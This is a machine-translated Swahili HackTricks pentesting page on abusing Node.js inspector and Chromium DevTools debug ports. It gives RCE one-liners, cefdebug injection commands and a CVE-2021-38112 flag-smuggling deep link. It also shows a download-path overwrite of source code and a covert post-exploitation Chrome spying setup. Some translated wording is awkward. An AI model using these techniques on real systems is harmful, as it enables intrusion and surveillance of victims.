# Node inspector/CEF debug abuse

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) **na** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repos za github**.

</details>

## Taarifa Msingi

[Kutoka kwenye nyaraka](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wakati inaanza na kubadilisha `--inspect`, mchakato wa Node.js unasikiliza mteja wa kudukua. Kwa **kawaida**, itasikiliza kwenye mwenyeji na bandari **`127.0.0.1:9229`**. Kila mchakato pia una **UUID** **ya kipekee**.

Wateja wa Inspector lazima wajue na waweke anwani ya mwenyeji, bandari, na UUID ili kuunganisha. URL kamili itaonekana kama `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Kwa kuwa **kudukuzi ana ufikiaji kamili kwa mazingira ya utekelezaji wa Node.js**, mtendaji mwenye nia mbaya anayeweza kuunganisha kwenye bandari hii anaweza kuweza kutekeleza nambari yoyote kwa niaba ya mchakato wa Node.js (**kuongeza mamlaka ya upendeleo**).
{% endhint %}

Kuna njia kadhaa za kuanza inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wakati unapoanza mchakato uliochunguzwa, kitu kama hiki kitatokea:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Mchakato unaotegemea **CEF** (**Chromium Embedded Framework**) kama vile unahitaji kutumia param: `--remote-debugging-port=9222` ili kufungua **debugger** (ulinzi wa SSRF unabaki kuwa sawa sana). Walakini, badala yake watakavyotoa kikao cha **debug** cha **NodeJS**, watawasiliana na kivinjari kwa kutumia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), hii ni kiolesura cha kudhibiti kivinjari, lakini hakuna RCE moja kwa moja.

Unapoanza kivinjari kilichodhibitiwa kwa kufuatilia, kitu kama hiki kitatokea:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Vivinjari, WebSockets, na sera ya asili sawa <a href="#vivinjari-websockets-na-sera-ya-asili-sawa" id="vivinjari-websockets-na-sera-ya-asili-sawa"></a>

Tovuti zinazofunguliwa kwenye kivinjari cha wavuti zinaweza kufanya ombi la WebSocket na HTTP chini ya mfano wa usalama wa kivinjari. **Unganisho la awali la HTTP** ni muhimu ili **kupata kitambulisho cha kikao cha kudhibiti**. **Sera ya asili sawa** **inazuia** tovuti kutoka kuweza kufanya **unganisho hili la HTTP**. Kwa usalama zaidi dhidi ya [**mashambulizi ya DNS rebinding**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js inathibitisha kuwa vichwa vya **'Host'** kwa uunganisho huo vinabainisha **anwani ya IP** au **`localhost`** au **`localhost6`** kwa usahihi.

{% hint style="info" %}
Hatua hizi za usalama zinazuia kutumia kudhibiti kwa kusudi la kutekeleza nambari kwa **kutuma tu ombi la HTTP** (ambalo linaweza kufanywa kwa kutumia kasoro ya SSRF).
{% endhint %}

### Kuanza kudhibiti katika michakato inayofanya kazi

Unaweza kutuma **ishara SIGUSR1** kwa mchakato wa nodejs unaofanya kazi ili kufanya **kuanza kwa kudhibiti** kwenye bandari ya chaguo-msingi. Walakini, kumbuka kuwa unahitaji kuwa na **mamlaka ya kutosha**, kwa hivyo hii inaweza kukupa **upatikanaji wa mamlaka kwa habari ndani ya mchakato** lakini sio kuongeza mamlaka moja kwa moja.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Hii ni muhimu katika vyombo vya kuhifadhi kwa sababu **kuzima mchakato na kuanza mpya** na `--inspect` sio **chaguo** kwa sababu **chombo cha kuhifadhi** kitauawa na mchakato.
{% endhint %}

### Unganisha kwenye mkaguzi/mchunguzi

Ili kuunganisha kwenye kivinjari kinachotegemea Chromium, URL za `chrome://inspect` au `edge://inspect` zinaweza kupatikana kwa Chrome au Edge, mtawalia. Kwa kubonyeza kitufe cha Configure, hakikisha kuwa **mwenyeji na bandari ya lengo** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Utekelezaji wa Kanuni kwa Mbali (RCE):

![](<../../.gitbook/assets/image (620) (1).png>)

Kwa kutumia **mstari wa amri**, unaweza kuunganisha kwenye mkaguzi/mchunguzi na:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Zana [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), inaruhusu **kupata wachunguzi** wanaofanya kazi kwenye kompyuta yako na **kuingiza nambari** ndani yao.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Tafadhali kumbuka kuwa **NodeJS RCE exploits haitafanya kazi** ikiwa unaunganishwa na kivinjari kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata vitu vya kuvutia kufanya nayo).
{% endhint %}

## RCE katika NodeJS Debugger/Inspector

{% hint style="info" %}
Ikiwa umekuja hapa ukitafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Baadhi ya njia za kawaida za kupata **RCE** wakati unaweza **kuunganisha** kwenye Node **inspector** ni kutumia kitu kama hiki (inaonekana kuwa hii **haitafanya kazi katika uhusiano na Chrome DevTools protocol**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Vifurushi vya Itifaki ya Chrome DevTools

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Katika sehemu hii, nitataja mambo ya kuvutia ambayo watu wameitumia kuathiri itifaki hii.

### Uingizaji wa Parameta kupitia Viungo vya Kina

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security iligundua kuwa programu iliyotegemea CEF **iliandikisha URI maalum** katika mfumo (workspaces://) ambayo ilipokea URI kamili na kisha **kuendesha programu iliyotegemea CEF** na usanidi ulioundwa sehemu kutoka kwa URI hiyo.

Iligundulika kuwa parameta za URI zilikuwa zimefanyiwa URL decoding na kutumika kuendesha programu ya msingi ya CEF, kuruhusu mtumiaji ku**ingiza** bendera **`--gpu-launcher`** katika **mstari wa amri** na kutekeleza mambo yoyote.

Hivyo, kifurushi kama:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Nitatekeleza calc.exe.

### Kubadilisha Faili

Badilisha folda ambapo **faili zilizopakuliwa zitahifadhiwa** na pakua faili ili **kubadilisha** mara kwa mara **msimbo wa chanzo** wa programu na **msimbo wako mbaya**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Udukuzi wa Webdriver RCE na utekaji wa data

Kulingana na chapisho hili: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), ni iwezekanavyo kupata RCE na kuteka kurasa za ndani kutoka kwa theriver.

### Baada ya Udukuzi

Katika mazingira halisi na **baada ya kudukua** kompyuta ya mtumiaji anayetumia kivinjari kinachotegemea Chrome/Chromium, unaweza kuzindua mchakato wa Chrome na **kuwezesha uchunguzi na kuhamisha bandari ya uchunguzi** ili uweze kuifikia. Kwa njia hii, utaweza **kuchunguza kila kitu ambacho muathirika anafanya na Chrome na kuiba taarifa nyeti**.

Njia ya siri ni **kukomesha kila mchakato wa Chrome** na kisha kuita kitu kama
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Marejeo

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
